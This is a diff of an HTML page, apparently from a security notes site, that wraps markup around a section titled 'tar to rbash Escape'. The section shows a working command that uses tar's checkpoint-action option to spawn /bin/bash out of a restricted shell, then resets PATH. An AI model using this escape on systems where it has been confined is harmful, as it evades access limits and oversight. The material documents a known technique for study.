@@ -198,6 +198,7 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-tar-to-rbash-escape">Abuse #1: tar to rbash Escape</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Before enter rbash</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$PATH</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Enter rbash</span>
@@ -206,7 +207,8 @@
 </span></span><span class="line"><span class="cl">tar -cf /dev/null /dev/null --checkpoint<span class="o">=</span><span class="m">1</span> --checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>/bin/bash
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Paste the above $PATH (e.g.)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
